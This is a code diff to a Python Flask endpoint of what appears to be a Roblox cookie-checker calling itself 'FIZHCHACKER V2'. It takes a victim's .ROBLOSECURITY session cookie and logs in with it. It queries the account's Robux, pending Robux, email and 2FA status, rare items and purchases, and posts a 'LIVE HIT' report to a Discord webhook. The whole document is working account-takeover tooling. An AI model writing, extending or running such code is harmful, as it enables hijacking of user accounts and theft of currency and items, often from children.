@@ -15,14 +15,17 @@ def api_check():
     if not cookie:
         return jsonify({'result': {'status': 'invalid'}})
 
+    if not cookie.startswith('_|WARNING:'):
+        cookie = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + cookie
+
     cookies = {'.ROBLOSECURITY': cookie}
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Referer': 'https://www.roblox.com/'
     }
 
     try:
-        # 1. Validasi Autentikasi User
+        # 1. Validasi Autentikasi User Utama
         user_res = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies, headers=headers)
         if user_res.status_code != 200:
             return jsonify({'result': {'status': 'invalid'}})
@@ -32,7 +35,7 @@ def api_check():
         username = user_data.get('name')
         display_name = user_data.get('displayName')
 
-        # 2. Ambil Avatar
+        # 2. Ambil Avatar Headshot
         avatar_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false"
         headshot_res = requests.get(avatar_url, headers=headers)
         if headshot_res.status_code == 200:
@@ -49,33 +52,31 @@ def api_check():
         pending_robux = 0
         trans_res = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary', cookies=cookies, headers=headers)
         if trans_res.status_code == 200:
-            trans_data = trans_res.json()
-            pending_robux = trans_data.get('pendingRobuxTotal', 0)
+            pending_robux = trans_res.json().get('pendingRobuxTotal', 0)
 
         rap = 0 
         saved_payment = "None Detected"
 
-        # 4. Status Keamanan
-        settings_res = requests.get('https://accountsettings.roblox.com/v1/email', cookies=cookies, headers=headers)
+        # 4. Status Keamanan Riil (Email & 2FA)
         email_status = "Unverified"
+        settings_res = requests.get('https://accountsettings.roblox.com/v1/email', cookies=cookies, headers=headers)
         if settings_res.status_code == 200:
-            email_data = settings_res.json()
-            if email_data.get('verified'):
-                email_addr = email_data.get('emailAddress', '')
+            ed = settings_res.json()
+            if ed.get('verified'):
+                email_addr = ed.get('emailAddress', '')
                 email_status = f"Verified ({email_addr[:3]}***)" if email_addr else "Verified"
 
-        two_step_res = requests.get(f'https://twostepverification.roblox.com/v1/users/{user_id}/settings', cookies=cookies, headers=headers)
         has_a2f = False
-        if two_step_res.status_code == 200:
-            ts_data = two_step_res.json()
+        ts_res = requests.get(f'https://twostepverification.roblox.com/v1/users/{user_id}/settings', cookies=cookies, headers=headers)
+        if ts_res.status_code == 200:
+            ts_data = ts_res.json()
             has_a2f = any(ts_data.get(k, False) for k in ['isAuthenticatorEnabled', 'isEmailEnabled', 'isSmsEnabled'])
 
-        # 5. Cek Item & Icon Katalog (Headless, Korblox, VFX, Limited)
+        # 5. Cek Kepemilikan Item Katalog Murni via Inventory API
         def check_item_owned(asset_id):
             inv = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/asset/{asset_id}', cookies=cookies, headers=headers)
             if inv.status_code == 200:
-                data_inv = inv.json().get('data', [])
-                return len(data_inv) > 0
+                return len(inv.json().get('data', [])) > 0
             return False
 
         def get_asset_icon(asset_id):
@@ -84,53 +85,66 @@ def api_check():
                 t_data = t_res.json().get('data', [])
                 if t_data:
                     return t_data[0].get('imageUrl', '')
-            return "https://tr.rbxcdn.com/3941584c7f041d8e13fcd779b5b15df3/150/150/Image/Png"
+            return avatar_url
 
         headless_owned = check_item_owned(134082579)
         korblox_owned = check_item_owned(139607718)
         vfx_owned = check_item_owned(98436573)
         limited_owned = check_item_owned(45484837)
 
-        animations = [
-            {"name": "Mage Animation Pack", "icon": get_asset_icon(106753330)}
-        ]
+        # 6. Animasi Aktual dari Avatar yang Sedang Dikenakan (Equipped Assets)
+        animations = []
+        avatar_wearing = requests.get(f'https://avatar.roblox.com/v1/users/{user_id}/avatar', headers=headers)
+        if avatar_wearing.status_code == 200:
+            asset_ids = avatar_wearing.json().get('assetIds', [])
+            for aid in asset_ids:
+                # Filter atau ambil aset tipe animasi/bundle jika ada di assetIds
+                icon = get_asset_icon(aid)
+                animations.append({"name": f"Asset ID: {aid}", "icon": icon})
+
+        if not animations:
+            animations.append({"name": "No Active Animations", "icon": avatar_url})
 
         headless_data = {"name": "Headless Horseman", "status": headless_owned, "icon": get_asset_icon(134082579)}
         korblox_data = {"name": "Korblox Deathspeaker", "status": korblox_owned, "icon": get_asset_icon(139607718)}
         vfx_data = {"name": "VFX / Particle Effect", "status": vfx_owned, "icon": get_asset_icon(98436573)}
         limited_data = {"name": "Limited Collectible", "status": limited_owned, "icon": get_asset_icon(45484837)}
 
-        # 6. Riwayat Game & Spent Map
+        # 7. Riwayat Game & Spent Game Murni dari Endpoint Roblox
         game_spent = []
         game_history = []
 
-        games_res = requests.get(f'https://games.roblox.com/v1/users/{user_id}/games?limit=5', headers=headers)
-        if games_res.status_code == 200:
-            games_data = games_res.json().get('data', [])
-            for g in games_data[:3]:
-                universe_id = g.get('id')
-                g_name = g.get('name')
-                
-                icon_res = requests.get(f'https://thumbnails.roblox.com/v1/games/icons?universeIds={universe_id}&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false', headers=headers)
-                g_icon = "https://tr.rbxcdn.com/3941584c7f041d8e13fcd779b5b15df3/150/150/Image/Png"
-                if icon_res.status_code == 200:
-                    icon_data = icon_res.json().get('data', [])
-                    if icon_data:
-                        g_icon = icon_data[0].get('imageUrl', g_icon)
-
-                game_history.append({"name": g_name, "icon": g_icon})
-                game_spent.append({"name": g_name, "icon": g_icon, "spent": "0"})
+        # Ambil Presence (Lokasi Game Terakhir yang Dimainkan)
+        pres_res = requests.post('https://presence.roblox.com/v1/presence/users', json={"userIds": [user_id]}, cookies=cookies, headers=headers)
+        if pres_res.status_code == 200:
+            pres_list = pres_res.json().get('userPresences', [])
+            if pres_list:
+                loc = pres_list[0].get('lastLocation')
+                game_type = pres_list[0].get('type')
+                if loc:
+                    game_history.append({"name": loc, "icon": avatar_url})
 
         if not game_history:
-            game_history.append({"name": "No Recent Games", "icon": avatar_url})
-            game_spent.append({"name": "No In-Game Data", "icon": avatar_url, "spent": "0"})
+            game_history.append({"name": "No Recent Game Session", "icon": avatar_url})
 
-        # Webhook Discord
+        # Ambil Transaksi Pembelian Riil
+        trans_list_res = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transactions?cursor=&limit=5&transactionType=Purchase', cookies=cookies, headers=headers)
+        if trans_list_res.status_code == 200:
+            t_data = trans_list_res.json().get('data', [])
+            for t in t_data:
+                det = t.get('details', {})
+                name = det.get('name', 'In-Game Purchase') if isinstance(det, dict) else 'Purchase'
+                amt = t.get('currency', {}).get('amount', 0)
+                game_spent.append({"name": name, "icon": avatar_url, "spent": str(abs(amt))})
+
+        if not game_spent:
+            game_spent.append({"name": "No Spent Records Found", "icon": avatar_url, "spent": "0"})
+
+        # Webhook Discord Notifikasi
         if webhook_url:
-            discord_payload = {
-                "content": f"🚨 **FIZHCHACKER V2 - HIT ACCOUNT**\n👤 User: `{username}`\n💰 Robux: `{robux}` (Pending: `{pending_robux}`)\n💀 Headless: `{headless_owned}` | Korblox: `{korblox_owned}` | VFX: `{vfx_owned}`"
-            }
-            requests.post(webhook_url, json=discord_payload)
+            requests.post(webhook_url, json={
+                "content": f"🚨 **FIZHCHACKER V2 - LIVE HIT**\n👤 User: `{username}`\n📧 Email: `{email_status}` | 2FA: `{has_a2f}`\n💰 Robux: `{robux}`"
+            })
 
         return jsonify({
             "result": {
@@ -145,7 +159,7 @@ def api_check():
                 "rap": rap,
                 "saved_payment": saved_payment,
                 "email_status": email_status,
-                "has_a2f": has_a2f,
+                "has_a2f": "Enabled ⚠️" if has_a2f else "Disabled",
                 "refreshed_cookie": cookie,
                 "animations": animations,
                 "headless": headless_data,
